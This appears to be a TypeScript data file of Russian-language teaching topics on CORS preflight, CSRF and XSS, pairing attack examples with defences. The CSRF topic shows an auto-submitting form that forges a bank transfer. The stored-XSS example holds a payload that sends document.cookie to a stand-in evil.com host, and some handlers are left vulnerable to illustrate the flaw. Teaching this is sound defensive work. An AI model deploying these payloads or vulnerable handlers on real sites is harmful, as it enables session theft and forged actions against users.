import { Topic } from '../../../types';

export const NETWORK_BROWSER_SECURITY_INTERMEDIATE_TOPICS: Topic[] = [
  {
    id: 'cors-preflight',
    title: 'Preflight-запрос',
    difficulty: 'intermediate',
    description: 'Preflight-запрос — автоматический OPTIONS-запрос браузера перед сложными CORS-запросами. Браузер проверяет, разрешён ли запрос, отправляя preflight с информацией о методе и заголовках. Сервер отвечает заголовками Access-Control-Allow-Methods и Access-Control-Allow-Headers. Если preflight успешен, браузер отправляет основной запрос. Понимание preflight важно для диагностики CORS-ошибок.',
    keyPoints: [
      'Триггеры: сложные запросы (PUT, DELETE, кастомные заголовки, application/json) требуют preflight.',
      'OPTIONS-запрос: браузер автоматически отправляет перед основным запросом.',
      'Заголовки preflight: Access-Control-Request-Method, Access-Control-Request-Headers.',
      'Ответ сервера: Access-Control-Allow-Methods, Access-Control-Allow-Headers, Access-Control-Max-Age.',
      'Кеширование: Access-Control-Max-Age определяет, как долго кешировать результат preflight.',
      'Диагностика: ошибки preflight блокируют основной запрос, нужно проверить заголовки ответа сервера.'
    ],
    tags: ['networks', 'cors', 'security', 'api', 'intermediate'],
    examples: [
      {
        title: 'Как работает preflight',
        code: `// КЛИЕНТ отправляет сложный запрос:
fetch('https://api.other.com/users/1', {
  method: 'PUT',
  headers: {
    'Content-Type': 'application/json',
    'Authorization': 'Bearer token123'
  },
  body: JSON.stringify({name: 'John'})
});

// БРАУЗЕР автоматически отправляет preflight (OPTIONS):
OPTIONS /users/1 HTTP/1.1
Host: api.other.com
Origin: https://example.com
Access-Control-Request-Method: PUT
Access-Control-Request-Headers: content-type,authorization

// СЕРВЕР должен ответить:
HTTP/1.1 200 OK
Access-Control-Allow-Origin: https://example.com
Access-Control-Allow-Methods: PUT, POST, GET, DELETE
Access-Control-Allow-Headers: content-type, authorization
Access-Control-Max-Age: 3600

// БРАУЗЕР проверяет:
// - Метод PUT разрешён? ✅
// - Заголовки content-type, authorization разрешены? ✅
// - Origin разрешён? ✅

// Если всё OK → отправляет основной запрос:
PUT /users/1 HTTP/1.1
Host: api.other.com
Origin: https://example.com
Content-Type: application/json
Authorization: Bearer token123

{"name": "John"}`
      },
      {
        title: 'Ошибка preflight',
        code: `// КЛИЕНТ отправляет запрос:
fetch('https://api.other.com/users/1', {
  method: 'PUT',
  headers: {
    'X-Custom-Header': 'value'
  }
});

// СЕРВЕР отвечает на preflight:
HTTP/1.1 200 OK
Access-Control-Allow-Origin: https://example.com
Access-Control-Allow-Methods: GET, POST
// ❌ PUT не разрешён!

// БРАУЗЕР блокирует запрос:
// ❌ Access to fetch ... has been blocked by CORS policy: 
//    Method PUT is not allowed by Access-Control-Allow-Methods

// РЕШЕНИЕ:
// Сервер должен разрешить PUT:
Access-Control-Allow-Methods: GET, POST, PUT, DELETE`
      },
      {
        title: 'Кеширование preflight',
        code: `// Access-Control-Max-Age определяет время кеширования preflight

// СЕРВЕР отвечает:
Access-Control-Max-Age: 3600
// Preflight кешируется на 1 час

// ПОВЕДЕНИЕ:
// 1. Первый запрос → preflight (OPTIONS) → основной запрос
// 2. Второй запрос (в течение часа) → основной запрос (preflight из кеша)
// 3. После часа → preflight снова

// ОПТИМИЗАЦИЯ:
// - Увеличить Max-Age для стабильных API
// - Уменьшить для часто меняющихся правил

// ПРИМЕР:
Access-Control-Max-Age: 86400 // 24 часа
// Preflight кешируется на сутки`
      },
      {
        title: 'Запросы, требующие preflight',
        code: `// ТРЕБУЮТ PREFLIGHT:
// 1. Методы: PUT, DELETE, PATCH
fetch('https://api.other.com/users/1', {
  method: 'PUT' // ❌ preflight
});

// 2. Кастомные заголовки
fetch('https://api.other.com/users', {
  headers: {
    'X-Custom-Header': 'value' // ❌ preflight
  }
});

// 3. Content-Type: application/json
fetch('https://api.other.com/users', {
  method: 'POST',
  headers: {
    'Content-Type': 'application/json' // ❌ preflight
  },
  body: JSON.stringify({name: 'John'})
});

// НЕ ТРЕБУЮТ PREFLIGHT:
// 1. GET, POST, HEAD с простыми заголовками
fetch('https://api.other.com/users'); // ✅ без preflight

// 2. POST с form-data
fetch('https://api.other.com/users', {
  method: 'POST',
  headers: {
    'Content-Type': 'application/x-www-form-urlencoded' // ✅ без preflight
  },
  body: 'name=John'
});`
      }
    ],
    relatedTopics: ['cors-basics', 'http-methods-status']
  },
  {
    id: 'csrf-xss',
    title: 'CSRF и XSS',
    difficulty: 'intermediate',
    description: 'CSRF (Cross-Site Request Forgery) и XSS (Cross-Site Scripting) — два основных типа веб-атак. CSRF заставляет пользователя выполнить действия на другом сайте без его ведома, используя его сессию. XSS внедряет вредоносный код в страницу, который выполняется в контексте жертвы. Защита от CSRF: CSRF-токены, SameSite cookies. Защита от XSS: санитизация входных данных, Content Security Policy.',
    keyPoints: [
      'CSRF: атака, когда злоумышленник заставляет жертву выполнить действия на другом сайте.',
      'Механизм CSRF: использование активной сессии жертвы для выполнения запросов от её имени.',
      'Защита от CSRF: CSRF-токены, SameSite cookies, проверка Referer/Origin.',
      'XSS: внедрение вредоносного JavaScript-кода в страницу, который выполняется в браузере жертвы.',
      'Типы XSS: Reflected (отражённый), Stored (сохранённый), DOM-based (на стороне клиента).',
      'Защита от XSS: санитизация входных данных, экранирование вывода, Content Security Policy.'
    ],
    tags: ['networks', 'security', 'csrf', 'xss', 'browser', 'intermediate'],
    examples: [
      {
        title: 'CSRF атака',
        code: `// ЗЛОУМЫШЛЕННИК создаёт сайт evil.com:
<img src="https://bank.com/transfer?to=attacker&amount=1000">

// ЖЕРТВА заходит на evil.com (у неё активна сессия bank.com)
// Браузер автоматически отправляет запрос на bank.com с cookies
// Банк видит валидную сессию и выполняет перевод

// ИЛИ через форму:
<form action="https://bank.com/transfer" method="POST">
  <input type="hidden" name="to" value="attacker">
  <input type="hidden" name="amount" value="1000">
</form>
<script>document.forms[0].submit();</script>

// Запрос отправляется автоматически с cookies жертвы`
      },
      {
        title: 'Защита от CSRF',
        code: `// 1. CSRF-ТОКЕНЫ
// Сервер генерирует токен и отправляет в форме:
<form action="/transfer" method="POST">
  <input type="hidden" name="csrf_token" value="abc123">
  <input type="text" name="to">
  <input type="number" name="amount">
</form>

// Сервер проверяет токен при запросе
// Злоумышленник не знает токен → атака блокируется

// 2. SAMESITE COOKIES
Set-Cookie: session_id=abc123; SameSite=Strict
// Cookies не отправляются с cross-site запросами

// 3. ПРОВЕРКА REFERER/ORIGIN
// Сервер проверяет, что запрос пришёл с того же домена
if (request.headers.origin !== 'https://bank.com') {
  return 403; // Forbidden
}`
      },
      {
        title: 'XSS атака (Reflected)',
        code: `// УЯЗВИМЫЙ СЕРВЕР:
app.get('/search', (req, res) => {
  const query = req.query.q;
  res.send(\`<h1>Результаты поиска: \\\${query}</h1>\`);
});

// ЗЛОУМЫШЛЕННИК отправляет ссылку:
https://example.com/search?q=<script>alert('XSS')</script>

// ЖЕРТВА открывает ссылку
// Сервер возвращает:
<h1>Результаты поиска: <script>alert('XSS')</script></h1>

// Браузер выполняет скрипт → XSS атака

// ОПАСНОСТЬ:
// Скрипт может украсть cookies, данные, выполнить действия от имени жертвы`
      },
      {
        title: 'XSS атака (Stored)',
        code: `// УЯЗВИМЫЙ СЕРВЕР (комментарии):
app.post('/comments', (req, res) => {
  const comment = req.body.text;
  // Сохраняет без санитизации
  db.comments.save({text: comment});
});

// ЗЛОУМЫШЛЕННИК отправляет комментарий:
<script>
  fetch('https://evil.com/steal?cookie=' + document.cookie);
</script>

// Комментарий сохраняется в БД
// При отображении выполняется скрипт
// Все пользователи, открывающие страницу, подвергаются атаке`
      },
      {
        title: 'Защита от XSS',
        code: `// 1. САНИТИЗАЦИЯ ВХОДНЫХ ДАННЫХ
// Экранирование HTML:
function escapeHtml(text) {
  const map = {
    '&': '&amp;',
    '<': '&lt;',
    '>': '&gt;',
    '"': '&quot;',
    "'": '&#039;'
  };
  return text.replace(/[&<>"']/g, m => map[m]);
}

// Использование:
const userInput = req.body.comment;
const safe = escapeHtml(userInput);
res.send(\`<div>\\\${safe}</div>\`);

// 2. CONTENT SECURITY POLICY (CSP)
// Запрещает выполнение inline-скриптов:
Content-Security-Policy: script-src 'self'
// Разрешает только скрипты с того же домена

// 3. HTTPONLY COOKIES
Set-Cookie: session_id=abc123; HttpOnly
// Cookies недоступны из JavaScript → защита от кражи

// 4. БИБЛИОТЕКИ САНИТИЗАЦИИ
// DOMPurify для HTML
// validator.js для валидации`
      }
    ],
    relatedTopics: ['csp-basics', 'same-origin-policy', 'storage-comparison']
  }
];
